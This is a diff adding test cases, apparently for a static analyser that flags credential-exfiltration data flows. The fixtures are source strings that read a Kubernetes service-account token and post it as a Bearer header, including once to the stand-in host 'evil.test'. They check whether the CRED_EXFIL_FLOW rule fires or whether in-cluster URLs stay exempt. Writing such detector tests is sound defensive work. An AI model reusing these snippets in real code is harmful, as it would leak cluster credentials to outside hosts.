@@ -77,3 +77,69 @@ def test_helper_returned_credential_into_sink_param_in_overflowing_scope_convict
         + f"    upload(v{_PAD_N - 1})\n"
     )
     assert _flow_rules(src) == ["CRED_EXFIL_FLOW"]
+
+
+# ---- B-1084 ------------------------------------------------------------------------------------
+
+_SA = "/var/run/secrets/kubernetes.io/serviceaccount/token"
+_TOKEN_FN = f'def token():\n    with open("{_SA}") as f:\n        return f.read()\n'
+
+
+def test_parameter_shadowing_an_incluster_constant_does_not_borrow_the_exemption():
+    src = (
+        "import requests\n"
+        'API = "https://kubernetes.default.svc"\n'
+        + _TOKEN_FN
+        + "def call(API, tok):\n"
+        '    return requests.post(API, headers={"Authorization": "Bearer " + tok})\n'
+        'call("https://evil.test/x", token())\n'
+    )
+    assert _flow_rules(src) == ["CRED_EXFIL_FLOW"]
+
+
+def test_local_rebinding_shadowing_an_incluster_constant_does_not_borrow_the_exemption():
+    src = (
+        "import requests, os\n"
+        'API = "https://kubernetes.default.svc"\n'
+        + _TOKEN_FN
+        + "def call():\n"
+        '    API = os.environ["TARGET"]\n'
+        f'    tok = open("{_SA}").read()\n'
+        '    return requests.post(API, headers={"Authorization": "Bearer " + tok})\n'
+    )
+    assert _flow_rules(src) == ["CRED_EXFIL_FLOW"]
+
+
+def test_literal_incluster_url_through_a_helper_is_still_exempt():
+    src = (
+        "import requests\n"
+        + _TOKEN_FN
+        + "def call(path, tok):\n"
+        '    return requests.post("https://kubernetes.default.svc" + path, headers={"Authorization": "Bearer " + tok})\n'
+        'call("/api/v1/pods", token())\n'
+    )
+    assert _flow_rules(src) == []
+
+
+def test_unshadowed_module_constant_incluster_url_is_still_exempt():
+    src = (
+        "import requests\n"
+        'API = "https://kubernetes.default.svc"\n'
+        + _TOKEN_FN
+        + "def call(path, tok):\n"
+        '    return requests.post(API + path, headers={"Authorization": "Bearer " + tok})\n'
+        'call("/api/v1/pods", token())\n'
+    )
+    assert _flow_rules(src) == []
+
+
+def test_single_local_literal_incluster_url_is_still_exempt():
+    src = (
+        "import requests\n"
+        + _TOKEN_FN
+        + "def call(path):\n"
+        '    api = "https://kubernetes.default.svc"\n'
+        f'    tok = open("{_SA}").read()\n'
+        '    return requests.post(api + path, headers={"Authorization": "Bearer " + tok})\n'
+    )
+    assert _flow_rules(src) == []
